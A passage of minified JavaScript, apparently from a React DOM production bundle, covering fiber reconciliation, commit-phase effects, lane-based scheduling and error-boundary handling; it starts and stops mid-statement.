fe(n),null;if(s=(n.flags&128)!==0,a=i.rendering,a===null)if(s)ns(i,!1);else{if(se!==0||e!==null&&e.flags&128)for(e=n.child;e!==null;){if(a=Qr(e),a!==null){for(n.flags|=128,ns(i,!1),s=a.updateQueue,s!==null&&(n.updateQueue=s,n.flags|=4),n.subtreeFlags=0,s=t,t=n.child;t!==null;)i=t,e=s,i.flags&=14680066,a=i.alternate,a===null?(i.childLanes=0,i.lanes=e,i.child=null,i.subtreeFlags=0,i.memoizedProps=null,i.memoizedState=null,i.updateQueue=null,i.dependencies=null,i.stateNode=null):(i.childLanes=a.childLanes,i.lanes=a.lanes,i.child=a.child,i.subtreeFlags=0,i.deletions=null,i.memoizedProps=a.memoizedProps,i.memoizedState=a.memoizedState,i.updateQueue=a.updateQueue,i.type=a.type,e=a.dependencies,i.dependencies=e===null?null:{lanes:e.lanes,firstContext:e.firstContext}),t=t.sibling;return H(q,q.current&1|2),n.child}e=e.sibling}i.tail!==null&&J()>Vt&&(n.flags|=128,s=!0,ns(i,!1),n.lanes=4194304)}else{if(!s)if(e=Qr(a),e!==null){if(n.flags|=128,s=!0,t=e.updateQueue,t!==null&&(n.updateQueue=t,n.flags|=4),ns(i,!0),i.tail===null&&i.tailMode==="hidden"&&!a.alternate&&!Y)return fe(n),null}else 2*J()-i.renderingStartTime>Vt&&t!==1073741824&&(n.flags|=128,s=!0,ns(i,!1),n.lanes=4194304);i.isBackwards?(a.sibling=n.child,n.child=a):(t=i.last,t!==null?t.sibling=a:n.child=a,i.last=a)}return i.tail!==null?(n=i.tail,i.rendering=n,i.tail=n.sibling,i.renderingStartTime=J(),n.sibling=null,t=q.current,H(q,s?t&1|2:t&1),n):(fe(n),null);case 22:case 23:return so(),s=n.memoizedState!==null,e!==null&&e.memoizedState!==null!==s&&(n.flags|=8192),s&&n.mode&1?Le&1073741824&&(fe(n),n.subtreeFlags&6&&(n.flags|=8192)):fe(n),null;case 24:return null;case 25:return null}throw Error(T(156,n.tag))}function ym(e,n){switch(zl(n),n.tag){case 1:return Ae(n.type)&&Wr(),e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 3:return Ft(),G(Ne),G(ge),Gl(),e=n.flags,e&65536&&!(e&128)?(n.flags=e&-65537|128,n):null;case 5:return $l(n),null;case 13:if(G(q),e=n.memoizedState,e!==null&&e.dehydrated!==null){if(n.alternate===null)throw Error(T(340));Dt()}return e=n.flags,e&65536?(n.flags=e&-65537|128,n):null;case 19:return G(q),null;case 4:return Ft(),null;case 10:return Ul(n.type._context),null;case 22:case 23:return so(),null;case 24:return null;default:return null}}var dr=!1,me=!1,wm=typeof WeakSet=="function"?WeakSet:Set,O=null;function Tt(e,n){var t=e.ref;if(t!==null)if(typeof t=="function")try{t(null)}catch(s){Z(e,n,s)}else t.current=null}function Xa(e,n,t){try{t()}catch(s){Z(e,n,s)}}var bc=!1;function km(e,n){if(Ra=Fr,e=pp(),jl(e)){if("selectionStart"in e)var t={start:e.selectionStart,end:e.selectionEnd};else e:{t=(t=e.ownerDocument)&&t.defaultView||window;var s=t.getSelection&&t.getSelection();if(s&&s.rangeCount!==0){t=s.anchorNode;var r=s.anchorOffset,i=s.focusNode;s=s.focusOffset;try{t.nodeType,i.nodeType}catch{t=null;break e}var a=0,l=-1,o=-1,c=0,u=0,m=e,h=null;n:for(;;){for(var g;m!==t||r!==0&&m.nodeType!==3||(l=a+r),m!==i||s!==0&&m.nodeType!==3||(o=a+s),m.nodeType===3&&(a+=m.nodeValue.length),(g=m.firstChild)!==null;)h=m,m=g;for(;;){if(m===e)break n;if(h===t&&++c===r&&(l=a),h===i&&++u===s&&(o=a),(g=m.nextSibling)!==null)break;m=h,h=m.parentNode}m=g}t=l===-1||o===-1?null:{start:l,end:o}}else t=null}t=t||{start:0,end:0}}else t=null;for(Oa={focusedElem:e,selectionRange:t},Fr=!1,O=n;O!==null;)if(n=O,e=n.child,(n.subtreeFlags&1028)!==0&&e!==null)e.return=n,O=e;else for(;O!==null;){n=O;try{var k=n.alternate;if(n.flags&1024)switch(n.tag){case 0:case 11:case 15:break;case 1:if(k!==null){var y=k.memoizedProps,x=k.memoizedState,p=n.stateNode,f=p.getSnapshotBeforeUpdate(n.elementType===n.type?y:$e(n.type,y),x);p.__reactInternalSnapshotBeforeUpdate=f}break;case 3:var v=n.stateNode.containerInfo;v.nodeType===1?v.textContent="":v.nodeType===9&&v.documentElement&&v.removeChild(v.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(T(163))}}catch(w){Z(n,n.return,w)}if(e=n.sibling,e!==null){e.return=n.return,O=e;break}O=n.return}return k=bc,bc=!1,k}function vs(e,n,t){var s=n.updateQueue;if(s=s!==null?s.lastEffect:null,s!==null){var r=s=s.next;do{if((r.tag&e)===e){var i=r.destroy;r.destroy=void 0,i!==void 0&&Xa(n,t,i)}r=r.next}while(r!==s)}}function xi(e,n){if(n=n.updateQueue,n=n!==null?n.lastEffect:null,n!==null){var t=n=n.next;do{if((t.tag&e)===e){var s=t.create;t.destroy=s()}t=t.next}while(t!==n)}}function Ka(e){var n=e.ref;if(n!==null){var t=e.stateNode;switch(e.tag){case 5:e=t;break;default:e=t}typeof n=="function"?n(e):n.current=e}}function ld(e){var n=e.alternate;n!==null&&(e.alternate=null,ld(n)),e.child=null,e.deletions=null,e.sibling=null,e.tag===5&&(n=e.stateNode,n!==null&&(delete n[tn],delete n[Ps],delete n[Ia],delete n[tm],delete n[sm])),e.stateNode=null,e.return=null,e.dependencies=null,e.memoizedProps=null,e.memoizedState=null,e.pendingProps=null,e.stateNode=null,e.updateQueue=null}function od(e){return e.tag===5||e.tag===3||e.tag===4}function _c(e){e:for(;;){for(;e.sibling===null;){if(e.return===null||od(e.return))return null;e=e.return}for(e.sibling.return=e.return,e=e.sibling;e.tag!==5&&e.tag!==6&&e.tag!==18;){if(e.flags&2||e.child===null||e.tag===4)continue e;e.child.return=e,e=e.child}if(!(e.flags&2))return e.stateNode}}function Qa(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.nodeType===8?t.parentNode.insertBefore(e,n):t.insertBefore(e,n):(t.nodeType===8?(n=t.parentNode,n.insertBefore(e,t)):(n=t,n.appendChild(e)),t=t._reactRootContainer,t!=null||n.onclick!==null||(n.onclick=Hr));else if(s!==4&&(e=e.child,e!==null))for(Qa(e,n,t),e=e.sibling;e!==null;)Qa(e,n,t),e=e.sibling}function Za(e,n,t){var s=e.tag;if(s===5||s===6)e=e.stateNode,n?t.insertBefore(e,n):t.appendChild(e);else if(s!==4&&(e=e.child,e!==null))for(Za(e,n,t),e=e.sibling;e!==null;)Za(e,n,t),e=e.sibling}var oe=null,Ge=!1;function _n(e,n,t){for(t=t.child;t!==null;)cd(e,n,t),t=t.sibling}function cd(e,n,t){if(sn&&typeof sn.onCommitFiberUnmount=="function")try{sn.onCommitFiberUnmount(hi,t)}catch{}switch(t.tag){case 5:me||Tt(t,n);case 6:var s=oe,r=Ge;oe=null,_n(e,n,t),oe=s,Ge=r,oe!==null&&(Ge?(e=oe,t=t.stateNode,e.nodeType===8?e.parentNode.removeChild(t):e.removeChild(t)):oe.removeChild(t.stateNode));break;case 18:oe!==null&&(Ge?(e=oe,t=t.stateNode,e.nodeType===8?Qi(e.parentNode,t):e.nodeType===1&&Qi(e,t),Es(e)):Qi(oe,t.stateNode));break;case 4:s=oe,r=Ge,oe=t.stateNode.containerInfo,Ge=!0,_n(e,n,t),oe=s,Ge=r;break;case 0:case 11:case 14:case 15:if(!me&&(s=t.updateQueue,s!==null&&(s=s.lastEffect,s!==null))){r=s=s.next;do{var i=r,a=i.destroy;i=i.tag,a!==void 0&&(i&2||i&4)&&Xa(t,n,a),r=r.next}while(r!==s)}_n(e,n,t);break;case 1:if(!me&&(Tt(t,n),s=t.stateNode,typeof s.componentWillUnmount=="function"))try{s.props=t.memoizedProps,s.state=t.memoizedState,s.componentWillUnmount()}catch(l){Z(t,n,l)}_n(e,n,t);break;case 21:_n(e,n,t);break;case 22:t.mode&1?(me=(s=me)||t.memoizedState!==null,_n(e,n,t),me=s):_n(e,n,t);break;default:_n(e,n,t)}}function Sc(e){var n=e.updateQueue;if(n!==null){e.updateQueue=null;var t=e.stateNode;t===null&&(t=e.stateNode=new wm),n.forEach(function(s){var r=Am.bind(null,e,s);t.has(s)||(t.add(s),s.then(r,r))})}}function We(e,n){var t=n.deletions;if(t!==null)for(var s=0;s<t.length;s++){var r=t[s];try{var i=e,a=n,l=a;e:for(;l!==null;){switch(l.tag){case 5:oe=l.stateNode,Ge=!1;break e;case 3:oe=l.stateNode.containerInfo,Ge=!0;break e;case 4:oe=l.stateNode.containerInfo,Ge=!0;break e}l=l.return}if(oe===null)throw Error(T(160));cd(i,a,r),oe=null,Ge=!1;var o=r.alternate;o!==null&&(o.return=null),r.return=null}catch(c){Z(r,n,c)}}if(n.subtreeFlags&12854)for(n=n.child;n!==null;)ud(n,e),n=n.sibling}function ud(e,n){var t=e.alternate,s=e.flags;switch(e.tag){case 0:case 11:case 14:case 15:if(We(n,e),en(e),s&4){try{vs(3,e,e.return),xi(3,e)}catch(y){Z(e,e.return,y)}try{vs(5,e,e.return)}catch(y){Z(e,e.return,y)}}break;case 1:We(n,e),en(e),s&512&&t!==null&&Tt(t,t.return);break;case 5:if(We(n,e),en(e),s&512&&t!==null&&Tt(t,t.return),e.flags&32){var r=e.stateNode;try{xs(r,"")}catch(y){Z(e,e.return,y)}}if(s&4&&(r=e.stateNode,r!=null)){var i=e.memoizedProps,a=t!==null?t.memoizedProps:i,l=e.type,o=e.updateQueue;if(e.updateQueue=null,o!==null)try{l==="input"&&i.type==="radio"&&i.name!=null&&Ru(r,i),ba(l,a);var c=ba(l,i);for(a=0;a<o.length;a+=2){var u=o[a],m=o[a+1];u==="style"?zu(r,m):u==="dangerouslySetInnerHTML"?ju(r,m):u==="children"?xs(r,m):bl(r,u,m,c)}switch(l){case"input":va(r,i);break;case"textarea":Ou(r,i);break;case"select":var h=r._wrapperState.wasMultiple;r._wrapperState.wasMultiple=!!i.multiple;var g=i.value;g!=null?Nt(r,!!i.multiple,g,!1):h!==!!i.multiple&&(i.defaultValue!=null?Nt(r,!!i.multiple,i.defaultValue,!0):Nt(r,!!i.multiple,i.multiple?[]:"",!1))}r[Ps]=i}catch(y){Z(e,e.return,y)}}break;case 6:if(We(n,e),en(e),s&4){if(e.stateNode===null)throw Error(T(162));r=e.stateNode,i=e.memoizedProps;try{r.nodeValue=i}catch(y){Z(e,e.return,y)}}break;case 3:if(We(n,e),en(e),s&4&&t!==null&&t.memoizedState.isDehydrated)try{Es(n.containerInfo)}catch(y){Z(e,e.return,y)}break;case 4:We(n,e),en(e);break;case 13:We(n,e),en(e),r=e.child,r.flags&8192&&(i=r.memoizedState!==null,r.stateNode.isHidden=i,!i||r.alternate!==null&&r.alternate.memoizedState!==null||(no=J())),s&4&&Sc(e);break;case 22:if(u=t!==null&&t.memoizedState!==null,e.mode&1?(me=(c=me)||u,We(n,e),me=c):We(n,e),en(e),s&8192){if(c=e.memoizedState!==null,(e.stateNode.isHidden=c)&&!u&&e.mode&1)for(O=e,u=e.child;u!==null;){for(m=O=u;O!==null;){switch(h=O,g=h.child,h.tag){case 0:case 11:case 14:case 15:vs(4,h,h.return);break;case 1:Tt(h,h.return);var k=h.stateNode;if(typeof k.componentWillUnmount=="function"){s=h,t=h.return;try{n=s,k.props=n.memoizedProps,k.state=n.memoizedState,k.componentWillUnmount()}catch(y){Z(s,t,y)}}break;case 5:Tt(h,h.return);break;case 22:if(h.memoizedState!==null){Tc(m);continue}}g!==null?(g.return=h,O=g):Tc(m)}u=u.sibling}e:for(u=null,m=e;;){if(m.tag===5){if(u===null){u=m;try{r=m.stateNode,c?(i=r.style,typeof i.setProperty=="function"?i.setProperty("display","none","important"):i.display="none"):(l=m.stateNode,o=m.memoizedProps.style,a=o!=null&&o.hasOwnProperty("display")?o.display:null,l.style.display=Iu("display",a))}catch(y){Z(e,e.return,y)}}}else if(m.tag===6){if(u===null)try{m.stateNode.nodeValue=c?"":m.memoizedProps}catch(y){Z(e,e.return,y)}}else if((m.tag!==22&&m.tag!==23||m.memoizedState===null||m===e)&&m.child!==null){m.child.return=m,m=m.child;continue}if(m===e)break e;for(;m.sibling===null;){if(m.return===null||m.return===e)break e;u===m&&(u=null),m=m.return}u===m&&(u=null),m.sibling.return=m.return,m=m.sibling}}break;case 19:We(n,e),en(e),s&4&&Sc(e);break;case 21:break;default:We(n,e),en(e)}}function en(e){var n=e.flags;if(n&2){try{e:{for(var t=e.return;t!==null;){if(od(t)){var s=t;break e}t=t.return}throw Error(T(160))}switch(s.tag){case 5:var r=s.stateNode;s.flags&32&&(xs(r,""),s.flags&=-33);var i=_c(e);Za(e,i,r);break;case 3:case 4:var a=s.stateNode.containerInfo,l=_c(e);Qa(e,l,a);break;default:throw Error(T(161))}}catch(o){Z(e,e.return,o)}e.flags&=-3}n&4096&&(e.flags&=-4097)}function xm(e,n,t){O=e,pd(e)}function pd(e,n,t){for(var s=(e.mode&1)!==0;O!==null;){var r=O,i=r.child;if(r.tag===22&&s){var a=r.memoizedState!==null||dr;if(!a){var l=r.alternate,o=l!==null&&l.memoizedState!==null||me;l=dr;var c=me;if(dr=a,(me=o)&&!c)for(O=r;O!==null;)a=O,o=a.child,a.tag===22&&a.memoizedState!==null?Cc(r):o!==null?(o.return=a,O=o):Cc(r);for(;i!==null;)O=i,pd(i),i=i.sibling;O=r,dr=l,me=c}Ec(e)}else r.subtreeFlags&8772&&i!==null?(i.return=r,O=i):Ec(e)}}function Ec(e){for(;O!==null;){var n=O;if(n.flags&8772){var t=n.alternate;try{if(n.flags&8772)switch(n.tag){case 0:case 11:case 15:me||xi(5,n);break;case 1:var s=n.stateNode;if(n.flags&4&&!me)if(t===null)s.componentDidMount();else{var r=n.elementType===n.type?t.memoizedProps:$e(n.type,t.memoizedProps);s.componentDidUpdate(r,t.memoizedState,s.__reactInternalSnapshotBeforeUpdate)}var i=n.updateQueue;i!==null&&cc(n,i,s);break;case 3:var a=n.updateQueue;if(a!==null){if(t=null,n.child!==null)switch(n.child.tag){case 5:t=n.child.stateNode;break;case 1:t=n.child.stateNode}cc(n,a,t)}break;case 5:var l=n.stateNode;if(t===null&&n.flags&4){t=l;var o=n.memoizedProps;switch(n.type){case"button":case"input":case"select":case"textarea":o.autoFocus&&t.focus();break;case"img":o.src&&(t.src=o.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(n.memoizedState===null){var c=n.alternate;if(c!==null){var u=c.memoizedState;if(u!==null){var m=u.dehydrated;m!==null&&Es(m)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(T(163))}me||n.flags&512&&Ka(n)}catch(h){Z(n,n.return,h)}}if(n===e){O=null;break}if(t=n.sibling,t!==null){t.return=n.return,O=t;break}O=n.return}}function Tc(e){for(;O!==null;){var n=O;if(n===e){O=null;break}var t=n.sibling;if(t!==null){t.return=n.return,O=t;break}O=n.return}}function Cc(e){for(;O!==null;){var n=O;try{switch(n.tag){case 0:case 11:case 15:var t=n.return;try{xi(4,n)}catch(o){Z(n,t,o)}break;case 1:var s=n.stateNode;if(typeof s.componentDidMount=="function"){var r=n.return;try{s.componentDidMount()}catch(o){Z(n,r,o)}}var i=n.return;try{Ka(n)}catch(o){Z(n,i,o)}break;case 5:var a=n.return;try{Ka(n)}catch(o){Z(n,a,o)}}}catch(o){Z(n,n.return,o)}if(n===e){O=null;break}var l=n.sibling;if(l!==null){l.return=n.return,O=l;break}O=n.return}}var bm=Math.ceil,ei=bn.ReactCurrentDispatcher,Jl=bn.ReactCurrentOwner,Ue=bn.ReactCurrentBatchConfig,U=0,ie=null,ee=null,ce=0,Le=0,Ct=Gn(0),se=0,Is=null,ct=0,bi=0,eo=0,ys=null,Ee=null,no=0,Vt=1/0,un=null,ni=!1,Ja=null,Bn=null,hr=!1,Ln=null,ti=0,ws=0,el=null,Nr=-1,Ar=0;function xe(){return U&6?J():Nr!==-1?Nr:Nr=J()}function Fn(e){return e.mode&1?U&2&&ce!==0?ce&-ce:im.transition!==null?(Ar===0&&(Ar=Xu()),Ar):(e=V,e!==0||(e=window.event,e=e===void 0?16:tp(e.type)),e):1}function Qe(e,n,t,s){if(50<ws)throw ws=0,el=null,Error(T(185));Ws(e,t,s),(!(U&2)||e!==ie)&&(e===ie&&(!(U&2)&&(bi|=t),se===4&&An(e,ce)),Pe(e,s),t===1&&U===0&&!(n.mode&1)&&(Vt=J()+500,yi&&Yn()))}function Pe(e,n){var t=e.callbackNode;rf(e,n);var s=Br(e,e===ie?ce:0);if(s===0)t!==null&&Io(t),e.callbackNode=null,e.callbackPriority=0;else if(n=s&-s,e.callbackPriority!==n){if(t!=null&&Io(t),n===1)e.tag===0?rm(Nc.bind(null,e)):xp(Nc.bind(null,e)),em(function(){!(U&6)&&Yn()}),t=null;else{switch(Ku(s)){case 1:t=Cl;break;case 4:t=Yu;break;case 16:t=Dr;break;case 536870912:t=qu;break;default:t=Dr}t=wd(t,dd.bind(null,e))}e.callbackPriority=n,e.callbackNode=t}}function dd(e,n){if(Nr=-1,Ar=0,U&6)throw Error(T(327));var t=e.callbackNode;if(Ot()&&e.callbackNode!==t)return null;var s=Br(e,e===ie?ce:0);if(s===0)return null;if(s&30||s&e.expiredLanes||n)n=si(e,s);else{n=s;var r=U;U|=2;var i=fd();(ie!==e||ce!==n)&&(un=null,Vt=J()+500,tt(e,n));do try{Em();break}catch(l){hd(e,l)}while(!0);Fl(),ei.current=i,U=r,ee!==null?n=0:(ie=null,ce=0,n=se)}if(n!==0){if(n===2&&(r=Ca(e),r!==0&&(s=r,n=nl(e,r))),n===1)throw t=Is,tt(e,0),An(e,s),Pe(e,J()),t;if(n===6)An(e,s);else{if(r=e.current.alternate,!(s&30)&&!_m(r)&&(n=si(e,s),n===2&&(i=Ca(e),i!==0&&(s=i,n=nl(e,i))),n===1))throw t=Is,tt(e,0),An(e,s),Pe(e,J()),t;switch(e.finishedWork=r,e.finishedLanes=s,n){case 0:case 1:throw Error(T(345));case 2:Qn(e,Ee,un);break;case 3:if(An(e,s),(s&130023424)===s&&(n=no+500-J(),10<n)){if(Br(e,0)!==0)break;if(r=e.suspendedLanes,(r&s)!==s){xe(),e.pingedLanes|=e.suspendedLanes&r;break}e.timeoutHandle=ja(Qn.bind(null,e,Ee,un),n);break}Qn(e,Ee,un);break;case 4:if(An(e,s),(s&4194240)===s)break;for(n=e.eventTimes,r=-1;0<s;){var a=31-Ke(s);i=1<<a,a=n[a],a>r&&(r=a),s&=~i}if(s=r,s=J()-s,s=(120>s?120:480>s?480:1080>s?1080:1920>s?1920:3e3>s?3e3:4320>s?4320:1960*bm(s/1960))-s,10<s){e.timeoutHandle=ja(Qn.bind(null,e,Ee,un),s);break}Qn(e,Ee,un);break;case 5:Qn(e,Ee,un);break;default:throw Error(T(329))}}}return Pe(e,J()),e.callbackNode===t?dd.bind(null,e):null}function nl(e,n){var t=ys;return e.current.memoizedState.isDehydrated&&(tt(e,n).flags|=256),e=si(e,n),e!==2&&(n=Ee,Ee=t,n!==null&&tl(n)),e}function tl(e){Ee===null?Ee=e:Ee.push.apply(Ee,e)}function _m(e){for(var n=e;;){if(n.flags&16384){var t=n.updateQueue;if(t!==null&&(t=t.stores,t!==null))for(var s=0;s<t.length;s++){var r=t[s],i=r.getSnapshot;r=r.value;try{if(!Ze(i(),r))return!1}catch{return!1}}}if(t=n.child,n.subtreeFlags&16384&&t!==null)t.return=n,n=t;else{if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return!0;n=n.return}n.sibling.return=n.return,n=n.sibling}}return!0}function An(e,n){for(n&=~eo,n&=~bi,e.suspendedLanes|=n,e.pingedLanes&=~n,e=e.expirationTimes;0<n;){var t=31-Ke(n),s=1<<t;e[t]=-1,n&=~s}}function Nc(e){if(U&6)throw Error(T(327));Ot();var n=Br(e,0);if(!(n&1))return Pe(e,J()),null;var t=si(e,n);if(e.tag!==0&&t===2){var s=Ca(e);s!==0&&(n=s,t=nl(e,s))}if(t===1)throw t=Is,tt(e,0),An(e,n),Pe(e,J()),t;if(t===6)throw Error(T(345));return e.finishedWork=e.current.alternate,e.finishedLanes=n,Qn(e,Ee,un),Pe(e,J()),null}function to(e,n){var t=U;U|=1;try{return e(n)}finally{U=t,U===0&&(Vt=J()+500,yi&&Yn())}}function ut(e){Ln!==null&&Ln.tag===0&&!(U&6)&&Ot();var n=U;U|=1;var t=Ue.transition,s=V;try{if(Ue.transition=null,V=1,e)return e()}finally{V=s,Ue.transition=t,U=n,!(U&6)&&Yn()}}function so(){Le=Ct.current,G(Ct)}function tt(e,n){e.finishedWork=null,e.finishedLanes=0;var t=e.timeoutHandle;if(t!==-1&&(e.timeoutHandle=-1,Jf(t)),ee!==null)for(t=ee.return;t!==null;){var s=t;switch(zl(s),s.tag){case 1:s=s.type.childContextTypes,s!=null&&Wr();break;case 3:Ft(),G(Ne),G(ge),Gl();break;case 5:$l(s);break;case 4:Ft();break;case 13:G(q);break;case 19:G(q);break;case 10:Ul(s.type._context);break;case 22:case 23:so()}t=t.return}if(ie=e,ee=e=Un(e.current,null),ce=Le=n,se=0,Is=null,eo=bi=ct=0,Ee=ys=null,Jn!==null){for(n=0;n<Jn.length;n++)if(t=Jn[n],s=t.interleaved,s!==null){t.interleaved=null;var r=s.next,i=t.pending;if(i!==null){var a=i.next;i.next=r,s.next=a}t.pending=s}Jn=null}return e}function hd(e,n){do{var t=ee;try{if(Fl(),Er.current=Jr,Zr){for(var s=X.memoizedState;s!==null;){var r=s.queue;r!==null&&(r.pending=null),s=s.next}Zr=!1}if(ot=0,re=te=X=null,gs=!1,Os=0,Jl.current=null,t===null||t.return===null){se=1,Is=n,ee=null;break}e:{var i=e,a=t.return,l=t,o=n;if(n=ce,l.flags|=32768,o!==null&&typeof o=="object"&&typeof o.then=="function"){var c=o,u=l,m=u.tag;if(!(u.mode&1)&&(m===0||m===11||m===15)){var h=u.alternate;h?(u.updateQueue=h.updateQueue,u.memoizedState=h.memoizedState,u.lanes=h.lanes):(u.updateQueue=null,u.memoizedState=null)}var g=mc(a);if(g!==null){g.flags&=-257,gc(g,a,l,i,n),g.mode&1&&fc(i,c,n),n=g,o=c;var k=n.updateQueue;if(k===null){var y=new Set;y.add(o),n.updateQueue=y}else k.add(o);break e}else{if(!(n&1)){fc(i,c,n),ro();break e}o=Error(T(426))}}else if(Y&&l.mode&1){var x=mc(a);if(x!==null){!(x.flags&65536)&&(x.flags|=256),gc(x,a,l,i,n),Dl(Ut(o,l));break e}}i=o=Ut(o,l),se!==4&&(se=2),ys===null?ys=[i]:ys.push(i),i=a;do{switch(i.tag){case 3:i.flags|=65536,n&=-n,i.lanes|=n;var p=Kp(i,o,n);oc(i,p);break e;case 1:l=o;var f=i.type,v=i.stateNode;if(!(i.flags&128)&&(typeof f.getDerivedStateFromError=="function"||v!==null&&typeof v.componentDidCatch=="function"&&(Bn===null||!Bn.has(v)))){i.flags|=65536,n&=-n,i.lanes|=n;var w=Qp(i,l,n);oc(i,w);break e}}i=i.return}while(i!==null)}gd(t)}catch(_){n=_,ee===t&&t!==null&&(ee=t=t.return);continue}break}while(!0)}function fd(){var e=ei.current;return ei.current=Jr,e===null?Jr:e}function ro(){(se===0||se===3||se===2)&&(se=4),ie===null||!(ct&268435455)&&!(bi&268435455)||An(ie,ce)}function si(e,n){var t=U;U|=2;var s=fd();(ie!==e||ce!==n)&&(un=null,tt(e,n));do try{Sm();break}catch(r){hd(e,r)}while(!0);if(Fl(),U=t,ei.current=s,ee!==null)throw Error(T(261));return ie=null,ce=0,se}function Sm(){for(;ee!==null;)md(ee)}function Em(){for(;ee!==null&&!Xh();)md(ee)}function md(e){var n=yd(e.alternate,e,Le);e.memoizedProps=e.pendingProps,n===null?gd(e):ee=n,Jl.current=null}function gd(e){var n=e;do{var t=n.alternate;if(e=n.return,n.flags&32768){if(t=ym(t,n),t!==null){t.flags&=32767,ee=t;return}if(e!==null)e.flags|=32768,e.subtreeFlags=0,e.deletions=null;else{se=6,ee=null;return}}else if(t=vm(t,n,Le),t!==null){ee=t;return}if(n=n.sibling,n!==null){ee=n;return}ee=n=e}while(n!==null);se===0&&(se=5)}function Qn(e,n,t){var s=V,r=Ue.transition;try{Ue.transition=null,V=1,Tm(e,n,t,s)}finally{Ue.transition=r,V=s}return null}function Tm(e,n,t,s){do Ot();while(Ln!==null);if(U&6)throw Error(T(327));t=e.finishedWork;var r=e.finishedLanes;if(t===null)return null;if(e.finishedWork=null,e.finishedLanes=0,t===e.current)throw Error(T(177));e.callbackNode=null,e.callbackPriority=0;var i=t.lanes|t.childLanes;if(af(e,i),e===ie&&(ee=ie=null,ce=0),!(t.subtreeFlags&2064)&&!(t.flags&2064)||hr||(hr=!0,wd(Dr,function(){return Ot(),null})),i=(t.flags&15990)!==0,t.subtreeFlags&15990||i){i=Ue.transition,Ue.transition=null;var a=V;V=1;var l=U;U|=4,Jl.current=null,km(e,t),ud(t,e),Gf(Oa),Fr=!!Ra,Oa=Ra=null,e.current=t,xm(t),Kh(),U=l,V=a,Ue.transition=i}else e.current=t;if(hr&&(hr=!1,Ln=e,ti=r),i=e.pendingLanes,i===0&&(Bn=null),Jh(t.stateNode),Pe(e,J()),n!==null)for(s=e.onRecoverableError,t=0;t<n.length;t++)r=n[t],s(r.value,{componentStack:r.stack,digest:r.digest});if(ni)throw ni=!1,e=Ja,Ja=null,e;return ti&1&&e.tag!==0&&Ot(),i=e.pendingLanes,i&1?e===el?ws++:(ws=0,el=e):ws=0,Yn(),null}function Ot(){if(Ln!==null){var e=Ku(ti),n=Ue.transition,t=V;try{if(Ue.transition=null,V=16>e?16:e,Ln===null)var s=!1;else{if(e=Ln,Ln=null,ti=0,U&6)throw Error(T(331));var r=U;for(U|=4,O=e.current;O!==null;){var i=O,a=i.child;if(O.flags&16){var l=i.deletions;if(l!==null){for(var o=0;o<l.length;o++){var c=l[o];for(O=c;O!==null;){var u=O;switch(u.tag){case 0:case 11:case 15:vs(8,u,i)}var m=u.child;if(m!==null)m.return=u,O=m;else for(;O!==null;){u=O;var h=u.sibling,g=u.return;if(ld(u),u===c){O=null;break}if(h!==null){h.return=g,O=h;break}O=g}}}var k=i.alternate;if(k!==null){var y=k.child;if(y!==null){k.child=null;do{var x=y.sibling;y.sibling=null,y=x}while(y!==null)}}O=i}}if(i.subtreeFlags&2064&&a!==null)a.return=i,O=a;else e:for(;O!==null;){if(i=O,i.flags&2048)switch(i.tag){case 0:case 11:case 15:vs(9,i,i.return)}var p=i.sibling;if(p!==null){p.return=i.return,O=p;break e}O=i.return}}var f=e.current;for(O=f;O!==null;){a=O;var v=a.child;if(a.subtreeFlags&2064&&v!==null)v.return=a,O=v;else e:for(a=f;O!==null;){if(l=O,l.flags&2048)try{switch(l.tag){case 0:case 11:case 15:xi(9,l)}}catch(_){Z(l,l.return,_)}if(l===a){O=null;break e}var w=l.sibling;if(w!==null){w.return=l.return,O=w;break e}O=l.return}}if(U=r,Yn(),sn&&typeof sn.onPostCommitFiberRoot=="function")try{sn.onPostCommitFiberRoot(hi,e)}catch{}s=!0}return s}finally{V=t,Ue.transition=n}}return!1}function Ac(e,n,t){n=Ut(t,n),n=Kp(e,n,1),e=Dn(e,n,1),n=xe(),e!==null&&(Ws(e,1,n),Pe(e,n))}function Z(e,n,t){if(e.tag===3)Ac(e,e,t);else for(;n!==null;){if(n.tag===3){Ac(n,e,t);break}else if(n.tag===1){var s=n.stateNode;if(typeof n.type.getDerivedStateFromError=="function"||typeof s.componentDidCatch=="function"&&(Bn===null||!Bn.has(s))){e=Ut(t,e),e=Qp(n,e,1),n=Dn(n,e,1),e=xe(),n!==null&&(Ws(n,1,e),Pe(n,e));break}}n=n.return}}function Cm(e,n,t){var s=e.pingCache;s!==null&&s.delete(n),n=xe(),e.pingedLanes|=e.suspendedLanes&t,ie===e&&(ce&t)===t&&(se===4||se===3&&(ce&130023424)===ce&&500>J()-no?tt(e,0):eo|=t),Pe(e,n)}function vd(e,n){n===0&&(e.mode&1?(n=sr,sr<<=1,!(sr&130023424)&&(sr=4194304)):n=1);var t=xe();e=wn(e,n),e!==null&&(Ws(e,n,t),Pe(e,t))}function Nm(e){var n=e.memoizedState,t=0;n!==null&&(t=n.retryLane),vd(e,t)}function Am(e,n){var t=0;switch(e.tag){case 13:var s=e.stateNode,r=e.memoizedState;r!==null&&(t=r.retryLane);break;case 19:s=e.stateNode;break;default:throw Error(T(314))}s!==null&&s.delete(n),vd(e,t)}var yd;yd=function(e,n,t){if(e!==null)if(e.memoizedProps!==n.pendingProps||Ne.current)Te=!0;else{if(!(e.lanes&t)&&!(n.flags&128))return Te=!1,gm(e,n,t);Te=!!(e.flags&131072)}else Te=!1,Y&&n.flags&1048576&&bp(n,Yr,n.index);switch(n.lanes=0,n.tag){case 2:var s=n.type;Cr(e,n),e=n.pendingProps;var r=zt(n,ge.current);Rt(n,t),r=ql(null,n,s,e,r,t);var i=Xl();return n.flags|=1,typeof r=="object"&&r!==null&&typeof r.render=="function"&&r.$$typeof===void 0?(n.tag=1,n.memoizedState=null,n.updateQueue=null,Ae(s)?(i=!0,$r(n)):i=!1,n.memoizedState=r.state!==null&&r.state!==void 0?r.state:null,Hl(n),r.updater=ki,n.stateNode=r,r._reactInternals=n,Va(n,s,e,t),n=$a(null,n,s,!0,i,t)):(n.tag=0,Y&&i&&Il(n),we(null,n,r,t),n=n.child),n;case 16:s=n.elementType;e:{switch(Cr(e,n),e=n.pendingProps,r=s._init,s=r(s._payload),n.type=s,r=n.tag=Lm(s),e=$e(s,e),r){case 